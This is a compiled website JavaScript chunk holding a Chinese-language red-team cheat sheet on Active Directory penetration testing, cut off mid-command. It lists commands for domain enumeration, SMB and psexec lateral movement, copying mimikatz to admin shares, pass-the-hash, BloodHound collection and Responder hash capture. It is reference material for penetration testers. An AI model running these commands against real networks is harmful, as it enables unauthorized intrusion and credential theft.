"use strict";(self.webpackChunkmy_website=self.webpackChunkmy_website||[]).push([[341],{8385:(e,n,s)=>{s.r(n),s.d(n,{assets:()=>o,contentTitle:()=>d,default:()=>t,frontMatter:()=>r,metadata:()=>c,toc:()=>h});var i=s(5893),l=s(1151);const r={sidebar_label:"\u7d05\u968a\u5b89\u5168 | AD \u7db2\u57df\u6ef2\u900f\u6e2c\u8a66"},d="AD \u7db2\u57df\u6ef2\u900f\u6e2c\u8a66",c={id:"Cyber-Security/Red Team/AD_Pentest",title:"AD \u7db2\u57df\u6ef2\u900f\u6e2c\u8a66",description:"[TOC]",source:"@site/docs/Cyber-Security/Red Team/AD_Pentest.md",sourceDirName:"Cyber-Security/Red Team",slug:"/Cyber-Security/Red Team/AD_Pentest",permalink:"/docs/Cyber-Security/Red Team/AD_Pentest",draft:!1,unlisted:!1,tags:[],version:"current",frontMatter:{sidebar_label:"\u7d05\u968a\u5b89\u5168 | AD \u7db2\u57df\u6ef2\u900f\u6e2c\u8a66"},sidebar:"tutorialSidebar",previous:{title:"Red Team \u7d05\u968a\u5b89\u5168",permalink:"/docs/category/red-team-\u7d05\u968a\u5b89\u5168"},next:{title:"\u7d05\u968a\u5b89\u5168 | \u5f8c\u6ef2\u900f\u57fa\u790e",permalink:"/docs/Cyber-Security/Red Team/Post_Exploitation"}},o={},h=[{value:"AD \u57fa\u790e\u77e5\u8b58",id:"ad-\u57fa\u790e\u77e5\u8b58",level:2},{value:"Microsoft AD \u8a13\u7df4\u8ab2\u7a0b",id:"microsoft-ad-\u8a13\u7df4\u8ab2\u7a0b",level:3},{value:"DC",id:"dc",level:2},{value:"nmap",id:"nmap",level:3},{value:"information",id:"information",level:2},{value:"\u67e5\u8a62 Local User",id:"\u67e5\u8a62-local-user",level:3},{value:"\u67e5\u8a62 Domain User",id:"\u67e5\u8a62-domain-user",level:3},{value:"\u67e5\u8a62\u6b0a\u9650",id:"\u67e5\u8a62\u6b0a\u9650",level:3},{value:"\u67e5\u8a62\u9810\u8a2d\u9ad8\u6b0a\u9650\u7fa4\u7d44",id:"\u67e5\u8a62\u9810\u8a2d\u9ad8\u6b0a\u9650\u7fa4\u7d44",level:3},{value:"LDAP \u7c21\u4ecb\uff1a",id:"ldap-\u7c21\u4ecb",level:4},{value:"Lateral Movement(\u6a6b\u5411\u79fb\u52d5)",id:"lateral-movement\u6a6b\u5411\u79fb\u52d5",level:2},{value:"\u67e5\u8a62\u76ee\u524d\u7684 Domain Controller",id:"\u67e5\u8a62\u76ee\u524d\u7684-domain-controller",level:3},{value:"RDP \u9060\u7aef\u684c\u9762",id:"rdp-\u9060\u7aef\u684c\u9762",level:3},{value:"SMB",id:"smb",level:3},{value:"SMB Enumeration",id:"smb-enumeration",level:4},{value:"psexec",id:"psexec",level:4},{value:"\u7db2\u8def\u82b3\u9130",id:"\u7db2\u8def\u82b3\u9130",level:4},{value:"\u639b\u8f09\u9060\u7aef\u78c1\u789f",id:"\u639b\u8f09\u9060\u7aef\u78c1\u789f",level:4},{value:"share \u529f\u80fd",id:"share-\u529f\u80fd",level:4},{value:"CrackMapExec",id:"crackmapexec",level:3},{value:"Pass the Hash",id:"pass-the-hash",level:3},{value:"PowerShell Remoting(Windows Remote Management)",id:"powershell-remotingwindows-remote-management",level:3},{value:"GPO",id:"gpo",level:4},{value:"Recon",id:"recon",level:2},{value:"GPO enumeration",id:"gpo-enumeration",level:3},{value:"ldapsearch",id:"ldapsearch",level:3},{value:"GetUserSPNs[.]py",id:"getuserspnspy",level:3},{value:"Windows ADRecon.ps1",id:"windows-adreconps1",level:3},{value:"BloodHoundAD",id:"bloodhoundad",level:3},{value:"Responder",id:"responder",level:3},{value:"enum4linux",id:"enum4linux",level:3},{value:"Privilege Escalation",id:"privilege-escalation",level:2},{value:"KrbRelayUp",id:"krbrelayup",level:3},{value:"DavRelayUp",id:"davrelayup",level:3},{value:"Exploit",id:"exploit",level:2},{value:"Password Spraying(\u5bc6\u78bc\u5674\u7051)",id:"password-spraying\u5bc6\u78bc\u5674\u7051",level:3},{value:"NTLM Relay",id:"ntlm-relay",level:3},{value:"DavRelayUp",id:"davrelayup-1",level:3},{value:"Kerberoasting",id:"kerberoasting",level:3},{value:"DcSync",id:"dcsync",level:3},{value:"Dumping Hash",id:"dumping-hash",level:4},{value:"Generating Golden ticket",id:"generating-golden-ticket",level:4},{value:"AS-REP Roasting",id:"as-rep-roasting",level:3}];function a(e){const n={a:"a",admonition:"admonition",blockquote:"blockquote",code:"code",h1:"h1",h2:"h2",h3:"h3",h4:"h4",img:"img",li:"li",ol:"ol",p:"p",pre:"pre",strong:"strong",ul:"ul",...(0,l.a)(),...e.components};return(0,i.jsxs)(i.Fragment,{children:[(0,i.jsx)(n.h1,{id:"ad-\u7db2\u57df\u6ef2\u900f\u6e2c\u8a66",children:"AD \u7db2\u57df\u6ef2\u900f\u6e2c\u8a66"}),"\n",(0,i.jsx)(n.p,{children:"[TOC]"}),"\n",(0,i.jsx)(n.p,{children:":::spoiler \u5b78\u7fd2\u9023\u7d50"}),"\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsx)(n.li,{children:(0,i.jsx)(n.a,{href:"https://github.com/geeksniper/active-directory-pentest",children:"AD \u6ef2\u900f"})}),"\n",(0,i.jsx)(n.li,{children:(0,i.jsx)(n.a,{href:"https://www.cnblogs.com/zhianku/p/16535547.html",children:"\u5185\u7f51\u6e17\u900f\u5b66\u4e60\uff08\u56db\uff09\u57df\u6a2a\u5411\u79fb\u52a8\u2014\u2014SMB\u548cWMI\u670d\u52a1\u5229\u7528"})}),"\n",(0,i.jsx)(n.li,{children:(0,i.jsx)(n.a,{href:"https://www.ired.team/offensive-security/lateral-movement",children:"\u6a6b\u5411\u79fb\u52d5"})}),"\n",(0,i.jsx)(n.li,{children:(0,i.jsx)(n.a,{href:"https://ares-x.com/2020/03/21/%E5%9F%9F%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0%EF%BC%88%E5%9B%9B%EF%BC%89Dump-Password-Hash/",children:"\u57df\u6e17\u900f\u5b66\u4e60\uff08\u56db\uff09Dump Password & Hash\n"})}),"\n",(0,i.jsx)(n.li,{children:(0,i.jsx)(n.a,{href:"https://wwwstar.medium.com/%E5%85%A7%E7%B6%B2%E6%BB%B2%E9%80%8F-pass-the-hash-pth-%E6%94%BB%E6%93%8A%E6%89%8B%E6%B3%95%E5%8F%8A%E9%98%B2%E7%A6%A6-%E5%81%B5%E6%B8%AC%E6%8E%AA%E6%96%BD-e1d15e807a67",children:"[\u5167\u7db2\u6ef2\u900f]Pass the Hash(PtH)\u653b\u64ca\u624b\u6cd5\u53ca\u9632\u79a6\u3001\u5075\u6e2c\u63aa\u65bd"})}),"\n",(0,i.jsx)(n.li,{children:(0,i.jsx)(n.a,{href:"https://tech-blog.cymetrics.io/posts/zet/purple-man-my-superman/",children:"\u904a\u8d70\u7d05\u968a\u8207\u85cd\u968a\uff1aPurple man \u6211\u7684\u8d85\u4eba"})}),"\n",(0,i.jsxs)(n.li,{children:[(0,i.jsx)(n.a,{href:"https://zer1t0.gitlab.io/posts/attacking_ad/",children:"Attacking Active Directory"}),"\n:::"]}),"\n"]}),"\n",(0,i.jsx)(n.h2,{id:"ad-\u57fa\u790e\u77e5\u8b58",children:"AD \u57fa\u790e\u77e5\u8b58"}),"\n",(0,i.jsx)(n.h3,{id:"microsoft-ad-\u8a13\u7df4\u8ab2\u7a0b",children:"Microsoft AD \u8a13\u7df4\u8ab2\u7a0b"}),"\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsxs)(n.li,{children:["\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.a,{href:"https://learn.microsoft.com/zh-tw/training/paths/active-directory-domain-services/?source=recommendations",children:"https://learn.microsoft.com/zh-tw/training/paths/active-directory-domain-services/?source=recommendations"})}),"\n"]}),"\n",(0,i.jsx)(n.li,{}),"\n"]}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.img,{src:"https://hackmd.io/_uploads/H1I-QWtpC.png",alt:"image"})}),"\n",(0,i.jsxs)(n.blockquote,{children:["\n",(0,i.jsxs)(n.p,{children:["Graphic: Kerberos Unconstrained Delegation Communication Flow\n\u5716\u7247\u4f86\u6e90\uff1a",(0,i.jsx)(n.a,{href:"https://adsecurity.org/?p=1667",children:"https://adsecurity.org/?p=1667"})]}),"\n"]}),"\n",(0,i.jsx)(n.h2,{id:"dc",children:"DC"}),"\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsx)(n.li,{children:"DC (Domain Controller)"}),"\n",(0,i.jsx)(n.li,{children:"RODC (Read-Only Domain Controller)"}),"\n",(0,i.jsxs)(n.li,{children:["\u52a0\u5165 AD","\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsx)(n.li,{children:"DNS \u6307\u5411 AD"}),"\n",(0,i.jsx)(n.li,{children:"\u5c07\u7cfb\u7d71\u52a0\u5165 AD"}),"\n",(0,i.jsx)(n.li,{children:"\u4f7f\u7528\u7db2\u57df\u5e33\u865f\u767b\u5165"}),"\n"]}),"\n"]}),"\n",(0,i.jsx)(n.li,{children:"DC \u8207 DNS \u901a\u5e38\u662f\u540c\u4e00\u53f0"}),"\n",(0,i.jsx)(n.li,{children:"DC common port list\uff1a"}),"\n"]}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{children:"- Port 389 LDAP\n- Port 636 LDAP over SSL\n- Port 88 Kerberos Authentication\n- Port 3268 Global catalog Search\n- Port 3269 Global catalog LDAP over SSL\n"})}),"\n",(0,i.jsx)(n.h3,{id:"nmap",children:"nmap"}),"\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsx)(n.li,{children:(0,i.jsx)(n.code,{children:"nmap -p 88 --script=krb5-enum-users --script-args=\"krb5-enum-users.realm='<domain>',userdb=<user.txt>\" <ip>"})}),"\n"]}),"\n",(0,i.jsx)(n.h2,{id:"information",children:"information"}),"\n",(0,i.jsx)(n.h3,{id:"\u67e5\u8a62-local-user",children:"\u67e5\u8a62 Local User"}),"\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsx)(n.li,{children:(0,i.jsx)(n.code,{children:"net user"})}),"\n",(0,i.jsx)(n.li,{children:(0,i.jsx)(n.code,{children:"net user <username>"})}),"\n"]}),"\n",(0,i.jsx)(n.h3,{id:"\u67e5\u8a62-domain-user",children:"\u67e5\u8a62 Domain User"}),"\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsx)(n.li,{children:(0,i.jsx)(n.code,{children:"net user /domain"})}),"\n",(0,i.jsx)(n.li,{children:(0,i.jsx)(n.code,{children:"net user {username} /domain"})}),"\n"]}),"\n",(0,i.jsx)(n.h3,{id:"\u67e5\u8a62\u6b0a\u9650",children:"\u67e5\u8a62\u6b0a\u9650"}),"\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsx)(n.li,{children:(0,i.jsx)(n.code,{children:"whoami /priv"})}),"\n"]}),"\n",(0,i.jsx)(n.h3,{id:"\u67e5\u8a62\u9810\u8a2d\u9ad8\u6b0a\u9650\u7fa4\u7d44",children:"\u67e5\u8a62\u9810\u8a2d\u9ad8\u6b0a\u9650\u7fa4\u7d44"}),"\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsx)(n.li,{children:(0,i.jsx)(n.code,{children:"net groups /domain"})}),"\n",(0,i.jsx)(n.li,{children:(0,i.jsx)(n.code,{children:'net groups "Domain Admins" /domain'})}),"\n",(0,i.jsx)(n.li,{children:(0,i.jsx)(n.code,{children:'net groups "Schema Admins" /domain'})}),"\n",(0,i.jsx)(n.li,{children:(0,i.jsx)(n.code,{children:'net groups "Enterprise Admins" /domain'})}),"\n"]}),"\n",(0,i.jsx)(n.h4,{id:"ldap-\u7c21\u4ecb",children:"LDAP \u7c21\u4ecb\uff1a"}),"\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsxs)(n.li,{children:["DN",":Distinguish"," Name"]}),"\n",(0,i.jsx)(n.li,{children:"CN: Common Name"}),"\n",(0,i.jsxs)(n.li,{children:["OU",":Organization"," Unit Name"]}),"\n",(0,i.jsx)(n.li,{children:"DC: Domain Componet"}),"\n",(0,i.jsx)(n.li,{children:"LDAP Recon\uff1a"}),"\n"]}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{children:"kali\uff1a\nldapsearch -x -h <ip> -D 'user@domain' -w 'password' -b 'dc=<domain_name>,dc=<top_domain>' '(ObjectClass=user)'\n"})}),"\n",(0,i.jsx)(n.h2,{id:"lateral-movement\u6a6b\u5411\u79fb\u52d5",children:"Lateral Movement(\u6a6b\u5411\u79fb\u52d5)"}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"\u7528\u9014\uff1a\u64f4\u6563"})}),"\n",(0,i.jsx)(n.h3,{id:"\u67e5\u8a62\u76ee\u524d\u7684-domain-controller",children:"\u67e5\u8a62\u76ee\u524d\u7684 Domain Controller"}),"\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsx)(n.li,{children:(0,i.jsx)(n.code,{children:"echo %logonserver%"})}),"\n",(0,i.jsx)(n.li,{children:(0,i.jsx)(n.code,{children:"nltest /dclist:<domain>"})}),"\n"]}),"\n",(0,i.jsx)(n.h3,{id:"rdp-\u9060\u7aef\u684c\u9762",children:"RDP \u9060\u7aef\u684c\u9762"}),"\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsxs)(n.li,{children:["xfreerdp \u4e0b\u8f09\uff1a",(0,i.jsx)(n.code,{children:"sudo apt-get install freerdp2-x11"}),"\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsx)(n.li,{children:(0,i.jsx)(n.code,{children:"xfreerdp /u:<user> /p:'<password>' /v:<Host_IP>"})}),"\n",(0,i.jsx)(n.li,{children:(0,i.jsx)(n.code,{children:"xfreerdp /drive:share,/path/to/share /u:<user> /p:'<password>' /v:<Host_IP>"})}),"\n"]}),"\n"]}),"\n",(0,i.jsx)(n.li,{children:"\u62ff\u5230\u5e33\u865f\u5bc6\u78bc\u4f46\u9084\u4e0d\u80fd\u958bshell\uff0c\u53ef\u4ee5\u5148RDP\u9032\u53bb\uff0c\u518d\u653e\u5f8c\u9580\uff0c\u4e00\u822c\u4f86\u8aaa\u76f4\u63a5RDP\u6703\u592a\u660e\u986f\u3002"}),"\n"]}),"\n",(0,i.jsx)(n.h3,{id:"smb",children:"SMB"}),"\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsx)(n.li,{children:"ExternalBlue"}),"\n",(0,i.jsx)(n.li,{children:"WannaCry"}),"\n",(0,i.jsx)(n.li,{children:"port\uff1a139 (NetBIOS)"}),"\n",(0,i.jsx)(n.li,{children:"Port\uff1a445"}),"\n"]}),"\n",(0,i.jsx)(n.h4,{id:"smb-enumeration",children:"SMB Enumeration"}),"\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsxs)(n.li,{children:["smbclient","\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsx)(n.li,{children:(0,i.jsx)(n.code,{children:"smbclient -L \\\\<ip> -U user%password"})}),"\n"]}),"\n"]}),"\n",(0,i.jsx)(n.li,{children:"smbmap"}),"\n",(0,i.jsxs)(n.li,{children:["Crackmapexec","\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsx)(n.li,{children:(0,i.jsx)(n.code,{children:"crackmapexec smb <host_ip> --users"})}),"\n",(0,i.jsx)(n.li,{children:(0,i.jsx)(n.code,{children:"crackmapexec smb <host_ip> -u <username> -p <password>"})}),"\n"]}),"\n"]}),"\n",(0,i.jsxs)(n.li,{children:["enum4linux","\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsx)(n.li,{children:(0,i.jsx)(n.code,{children:"enum4linux -u <username> -p <password> <Host_IP>"})}),"\n"]}),"\n"]}),"\n"]}),"\n",(0,i.jsx)(n.h4,{id:"psexec",children:"psexec"}),"\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsx)(n.li,{children:"SMB \u958b shell"}),"\n",(0,i.jsxs)(n.li,{children:["\u7b2c\u4e00\u6b21\u4f7f\u7528\u5148\u63a5\u53d7 eula","\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsx)(n.li,{children:"psexec.exe -accepteula"}),"\n",(0,i.jsx)(n.li,{children:(0,i.jsx)(n.a,{href:"https://docs.microsoft.com/en-us/sysinternals/downloads/psexec",children:"https://docs.microsoft.com/en-us/sysinternals/downloads/psexec"})}),"\n"]}),"\n"]}),"\n",(0,i.jsxs)(n.li,{children:["\u4f7f\u7528psexec\u4e4b\u524d\u53ef\u4ee5\u5148\u7528smbmap\u78ba\u8a8d\u6b0a\u9650","\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsx)(n.li,{children:(0,i.jsx)(n.code,{children:"smbmap -u <username> -d <domain> -p <password> -H <host_ip>"})}),"\n"]}),"\n"]}),"\n",(0,i.jsxs)(n.li,{children:["\u6a6b\u5411\uff1a","\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsx)(n.li,{children:(0,i.jsx)(n.code,{children:"psexec.exe -accepteula \\\\<ip> -u [<domain>\\]<username> -p <password> cmd"})}),"\n",(0,i.jsxs)(n.li,{children:["impacket\uff1a",(0,i.jsx)(n.a,{href:"https://github.com/SecureAuthCorp/impacket",children:"https://github.com/SecureAuthCorp/impacket"}),"\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsx)(n.li,{children:(0,i.jsx)(n.code,{children:"impacket-psexec <user>@<ip>"})}),"\n",(0,i.jsx)(n.li,{children:(0,i.jsx)(n.code,{children:"proxychains psexec.py <username>:<passowrd>@<ip> whoami"})}),"\n"]}),"\n"]}),"\n"]}),"\n"]}),"\n"]}),"\n",(0,i.jsx)(n.h4,{id:"\u7db2\u8def\u82b3\u9130",children:"\u7db2\u8def\u82b3\u9130"}),"\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsxs)(n.li,{children:["\u8d70 ",(0,i.jsx)(n.strong,{children:"samba"})," \u5354\u8b70"]}),"\n",(0,i.jsx)(n.li,{children:"Domain admin \u53ef\u4ee5\u4efb\u610f\u89c0\u770b"}),"\n",(0,i.jsx)(n.li,{children:(0,i.jsx)(n.code,{children:"\\\\<ip>\\c$"})}),"\n",(0,i.jsx)(n.li,{children:(0,i.jsx)(n.code,{children:"smbclient -L \\\\<ip>\\c$"})}),"\n"]}),"\n",(0,i.jsx)(n.h4,{id:"\u639b\u8f09\u9060\u7aef\u78c1\u789f",children:"\u639b\u8f09\u9060\u7aef\u78c1\u789f"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{children:'- \u639b\u8f09\u9060\u7aef\u78c1\u789f\nnet use \\\\<ip>\\C$ "<password>" /user:<username>\n- \u67e5\u770b\u5df2\u639b\u8f09\u7684\u9060\u7aef\u78c1\u789f\nnet use\n- Copy \u6a94\u6848\ncopy mimikatz.exe \\\\<ip>\\C$\n'})}),"\n",(0,i.jsx)(n.h4,{id:"share-\u529f\u80fd",children:"share \u529f\u80fd"}),"\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsx)(n.li,{children:(0,i.jsx)(n.code,{children:"cme smb <ip> -u <username> -p <password> -d <domain> --shares"})}),"\n"]}),"\n",(0,i.jsx)(n.h3,{id:"crackmapexec",children:"CrackMapExec"}),"\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsxs)(n.li,{children:["Execute Commands","\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsx)(n.li,{children:(0,i.jsx)(n.code,{children:"crackmapexec smb [IP] -u administrator -p Passw0rd \u2010\u2010exec\u2010method mmcexec \u2010x 'whoami'"})}),"\n"]}),"\n",(0,i.jsxs)(n.blockquote,{children:["\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.code,{children:"--exec-method {mmcexec,smbexec,atexec,wmiexec}"})}),"\n"]}),"\n"]}),"\n"]}),"\n",(0,i.jsx)(n.h3,{id:"pass-the-hash",children:"Pass the Hash"}),"\n",(0,i.jsxs)(n.p,{children:["kali\uff1a",(0,i.jsx)(n.code,{children:"pth-winexe"})," ",(0,i.jsx)(n.a,{href:"https://github.com/byt3bl33d3r/pth-toolkit/tree/master",children:"https://github.com/byt3bl33d3r/pth-toolkit/tree/master"})]}),"\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsx)(n.li,{children:"\u7121\u6cd5\u904e Proxychains"}),"\n",(0,i.jsx)(n.li,{children:"\u985e\u4f3c Psexec\uff0c\u4f46\u652f\u63f4\u4ee5 Hash \u4ee3\u66ff\u5bc6\u78bc"}),"\n",(0,i.jsxs)(n.li,{children:["usage\uff1a",(0,i.jsx)(n.code,{children:"pth-winexe -U <domain>/<username>%aad3b435b51404eeaad3b435b51404ee(LM_Hash):<NTLM Hash> //<IP> cmd.exe"})]}),"\n"]}),"\n",(0,i.jsxs)(n.p,{children:["On Windows\uff1a\n",(0,i.jsx)(n.code,{children:"wmiexec.exe"}),"\uff1a",(0,i.jsx)(n.a,{href:"https://github.com/maaaaz/impacket-examples-windows/blob/master/wmiexec.exe",children:"https://github.com/maaaaz/impacket-examples-windows/blob/master/wmiexec.exe"})]}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.code,{children:"wmiexec.exe -hashes <LM>:<NTLM> <domain>/<username>@<ip> <command>"})}),"\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsxs)(n.li,{children:["Mimikatz\uff1a","\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsxs)(n.li,{children:["must dump hashes first\uff1a",(0,i.jsx)(n.code,{children:"sekurlsa::pth/user:Administrator/domain:atomic.local/ntlm:cc36cf7a8514893efccd3324464tkg1a"})]}),"\n",(0,i.jsxs)(n.li,{children:["Kerberos Ticket attack\n",(0,i.jsx)(n.code,{children:"kerberos::ptt Administrator@krbtgt-atomic.LOCAL.kirbi"})]}),"\n"]}),"\n"]}),"\n"]}),"\n",(0,i.jsx)(n.h3,{id:"powershell-remotingwindows-remote-management",children:"PowerShell Remoting(Windows Remote Management)"}),"\n",(0,i.jsxs)(n.blockquote,{children:["\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsx)(n.li,{children:"PowerShell Remoting only allows connections from members of the Administrators group"}),"\n",(0,i.jsx)(n.li,{children:"Members of the Remote Management Users group can access WMI resources over management protocols"}),"\n"]}),"\n"]}),"\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsxs)(n.li,{children:["PowerShell Remoting (and WinRM) listen on the following ports:","\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsx)(n.li,{children:"HTTP:5985"}),"\n",(0,i.jsx)(n.li,{children:"HTTPS:5986"}),"\n"]}),"\n"]}),"\n",(0,i.jsxs)(n.li,{children:["Recon\uff1a",(0,i.jsx)(n.code,{children:"crackmapexec winrm <host_ip> --users"})]}),"\n",(0,i.jsxs)(n.li,{children:["tools\uff1a","\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsxs)(n.li,{children:["\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.a,{href:"https://github.com/Hackplayers/evil-winrm",children:"https://github.com/Hackplayers/evil-winrm"})}),"\n"]}),"\n"]}),"\n"]}),"\n"]}),"\n",(0,i.jsx)(n.h4,{id:"gpo",children:"GPO"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{children:"\\\\<domain>\\SysVol\\<domain>\\Policie\n\\\\<domain>\\SysVol\\<domain>\\Policie\\<UID>\\Users\\Scripts\n\\\\<domain>\\SysVol\\<domain>\\Policie\\<UID>\\Machine\\Scripts\n"})}),"\n",(0,i.jsx)(n.h2,{id:"recon",children:"Recon"}),"\n",(0,i.jsx)(n.h3,{id:"gpo-enumeration",children:"GPO enumeration"}),"\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsxs)(n.li,{children:["\u7fa4\u7d44\u539f\u5247","\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsx)(n.li,{children:(0,i.jsx)(n.code,{children:"Get-NetGPO"})}),"\n"]}),"\n"]}),"\n"]}),"\n",(0,i.jsx)(n.h3,{id:"ldapsearch",children:"ldapsearch"}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.code,{children:'ldapsearch -H ldap://<ip> -D "<username>@<domain>" -w <password> -b \',DC=<domain>,DC=<root_domain>\' "(&(objectCategory=person)(objectClass=user))"'})}),"\n",(0,i.jsx)(n.h3,{id:"getuserspnspy",children:"GetUserSPNs[.]py"}),"\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsxs)(n.li,{children:["\u7528\u4f86\u67e5\u8a62\u7db2\u57df\u5167\u7528\u6236\u8a3b\u518a\u7684 SPN","\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsx)(n.li,{children:(0,i.jsx)(n.code,{children:"Import-Module .\\GetUserSPN.ps1"})}),"\n"]}),"\n"]}),"\n",(0,i.jsxs)(n.li,{children:["\u767c\u52d5",(0,i.jsx)(n.a,{href:"#Kerberoasting",children:"Kerberoasting"}),"\u524d\u5075\u67e5"]}),"\n"]}),"\n",(0,i.jsx)(n.h3,{id:"windows-adreconps1",children:"Windows ADRecon.ps1"}),"\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsx)(n.li,{children:(0,i.jsx)(n.a,{href:"https://github.com/adrecon/ADRecon",children:"https://github.com/adrecon/ADRecon"})}),"\n",(0,i.jsxs)(n.li,{children:["usage\uff1a",(0,i.jsx)(n.code,{children:"powershell.exe \u2013nop \u2013ep bypass .\\adrecon.ps1 -DomainController 10.10.40.168 -Credential LAB\\peko"})]}),"\n",(0,i.jsx)(n.li,{children:"Install-windowsfeature RSAT"}),"\n"]}),"\n",(0,i.jsx)(n.h3,{id:"bloodhoundad",children:"BloodHoundAD"}),"\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsxs)(n.li,{children:[(0,i.jsx)(n.a,{href:"https://github.com/BloodHoundAD/BloodHound/releases/tag/4.0.3",children:"https://github.com/BloodHoundAD/BloodHound/releases/tag/4.0.3"}),"\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsxs)(n.li,{children:["Collectors\uff1a",(0,i.jsx)(n.a,{href:"https://github.com/BloodHoundAD/BloodHound/tree/master/Collectors",children:"https://github.com/BloodHoundAD/BloodHound/tree/master/Collectors"})]}),"\n"]}),"\n"]}),"\n",(0,i.jsxs)(n.li,{children:[(0,i.jsx)(n.code,{children:".\\sharphound.exe -c all"}),"\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsx)(n.li,{children:"SharpHound.ps1"}),"\n",(0,i.jsx)(n.li,{children:"\u81ea\u52d5\u6253\u5305\uff1aTimestamp_BloodHound.zip --\x3e \u62d6\u5230\u8996\u7a97"}),"\n"]}),"\n"]}),"\n",(0,i.jsxs)(n.li,{children:["Neo4j Server","\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsx)(n.li,{children:(0,i.jsx)(n.a,{href:"https://neo4j.com/download-center/#community",children:"https://neo4j.com/download-center/#community"})}),"\n",(0,i.jsx)(n.li,{children:"path/to/neo4j/bin$ ./neo4j console"}),"\n",(0,i.jsx)(n.li,{children:"\u555f\u52d5\u5f8c\u81f3 localhost:7474 \u4fee\u6539\u9810\u8a2d\u5bc6\u78bc"}),"\n",(0,i.jsx)(n.li,{children:"\u9810\u8a2d\u5e33\u5bc6 neo4j/neo4j \u767b\u5165 BloodHoundAD"}),"\n"]}),"\n"]}),"\n"]}),"\n",(0,i.jsx)(n.h3,{id:"responder",children:"Responder"}),"\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsxs)(n.li,{children:[(0,i.jsx)(n.a,{href:"https://github.com/SpiderLabs/Responder",children:"https://github.com/SpiderLabs/Responder"})," (Kali \u9810\u8a2d\u6709\u88dd)"]}),"\n",(0,i.jsx)(n.li,{children:(0,i.jsx)(n.code,{children:"responder -I <\u7db2\u5361>"})}),"\n",(0,i.jsx)(n.li,{children:"\u7372\u53d6 NTLM Hash"}),"\n"]}),"\n",(0,i.jsx)(n.h3,{id:"enum4linux",children:"enum4linux"}),"\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsx)(n.li,{children:"\u679a\u8209 Windows \u548c Samba \u4e3b\u6a5f\u4e2d\u7684\u6578\u64da"}),"\n",(0,i.jsx)(n.li,{children:(0,i.jsx)(n.code,{children:"enum4linux -u <username> -p <password> <Host_IP>"})}),"\n"]}),"\n",(0,i.jsx)(n.h2,{id:"privilege-escalation",children:"Privilege Escalation"}),"\n",(0,i.jsx)(n.h3,{id:"krbrelayup",children:"KrbRelayUp"}),"\n",(0,i.jsx)(n.h3,{id:"davrelayup",children:"DavRelayUp"}),"\n",(0,i.jsx)(n.h2,{id:"exploit",children:"Exploit"}),"\n",(0,i.jsx)(n.h3,{id:"password-spraying\u5bc6\u78bc\u5674\u7051",children:"Password Spraying(\u5bc6\u78bc\u5674\u7051)"}),"\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsx)(n.li,{children:"\u5df2\u77e5\u5f88\u591a\u5e33\u865f\uff0c\u5617\u8a66\u4e00\u7a2e\u5bc6\u78bc\u505a\u5617\u8a66"}),"\n",(0,i.jsxs)(n.li,{children:["CrackMapExec\uff1a",(0,i.jsx)(n.a,{href:"https://github.com/byt3bl33d3r/CrackMapExec",children:"https://github.com/byt3bl33d3r/CrackMapExec"}),"\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsx)(n.li,{children:(0,i.jsx)(n.code,{children:"cme {protocol} {target(s)} -u username -p 